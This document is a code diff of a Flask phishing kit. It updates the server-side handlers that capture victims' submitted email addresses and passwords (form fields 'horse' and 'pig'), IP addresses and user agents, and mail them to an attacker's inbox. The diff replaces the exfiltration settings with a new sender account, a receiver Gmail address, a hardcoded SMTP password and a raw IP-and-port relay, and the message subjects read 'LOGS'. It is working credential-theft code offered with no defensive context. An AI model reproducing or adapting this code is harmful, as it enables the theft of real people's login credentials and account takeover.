@@ -124,7 +124,7 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/route2")
+@app.route("/m")
 def route2():
     web_param = request.args.get('web')
     if web_param:
@@ -145,12 +145,13 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsdis@hplimn.site"
-        receiver_email = "fazzaprivate.ae@gmail.com"
-        password = "dZB{tjvbEhKV"
+        sender_email = "contact@personalbio.site"
+        sender_emaill = "contact"
+        receiver_email = "mydinero888@gmail.com"
+        password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS"
+        message["Subject"] = "NAVERLOOK l0GS ! 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -163,8 +164,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.hplimn.site", 465) as server:
-            server.login(sender_email, password)
+        with smtplib.SMTP("91.217.246.43", 6040) as server:
+            server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
@@ -182,12 +183,13 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsdis@hplimn.site"
-        receiver_email = "fazzaprivate.ae@gmail.com"
-        password = "dZB{tjvbEhKV"
+        sender_email = "contact@personalbio.site"
+        sender_emaill = "contact"
+        receiver_email = "mydinero888@gmail.com"
+        password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS P2"
+        message["Subject"] = "NAVERLOOKS l0GS !! 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -200,8 +202,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.hplimn.site", 465) as server:
-            server.login(sender_email, password)
+        with smtplib.SMTP("91.217.246.43", 6040) as server:
+            server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
